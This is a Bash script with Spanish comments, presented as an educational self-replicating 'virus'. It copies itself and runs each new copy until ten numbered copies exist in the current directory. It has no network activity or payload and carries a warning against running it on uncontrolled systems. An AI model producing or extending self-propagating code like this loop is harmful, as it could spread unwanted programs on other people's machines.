#!/bin/bash


#
# Nombre: Virus Autorreplicante en Bash
# Descripción: 
#    Este script implementa un virus autorreplicante en Bash que se copia a sí mismo en el directorio actual.
#    Se generan hasta un máximo de 10 copias numeradas secuencialmente con el prefijo "VIRUS_NAME".
#
# Funcionamiento:
#    - Verifica cuántas copias del virus existen en el directorio actual.
#    - Si no ha alcanzado el límite definido en MAX_COPIAS, crea una nueva copia de sí mismo.
#    - Ejecuta la nueva copia del script.
#    - Si se ha alcanzado el límite, detiene la replicación.
#
# Advertencia:
#    - Este script es solo con fines educativos y no debe ejecutarse en sistemas no controlados.
#    - La ejecución de código malicioso sin consentimiento es ilegal y antiético.
#
# Autor: Germán Riveros S.
# Fecha: 29/03/2025
#                                                  



# Nombre base del virus
VIRUS_NAME="vb0001"
EXTENSION=".sh"
MAX_COPIAS=10

# Obtener el número de copias existentes en el directorio
copias_existentes=$(ls ${VIRUS_NAME}*${EXTENSION} 2>/dev/null)
num_copias=$(echo "$copias_existentes" | wc -l)

# Si aún no ha alcanzado el límite de copias, crear una nueva
if [ "$num_copias" -lt "$MAX_COPIAS" ]; then
    nuevo_nombre="${VIRUS_NAME}_$((num_copias + 1))${EXTENSION}"
    cp "$0" "$nuevo_nombre"  # Copiarse a sí mismo
    echo "Infectando... Creado $nuevo_nombre"

    # Ejecutar la nueva copia
    bash "$nuevo_nombre"
else
    echo "Límite de infección alcanzado."
fi
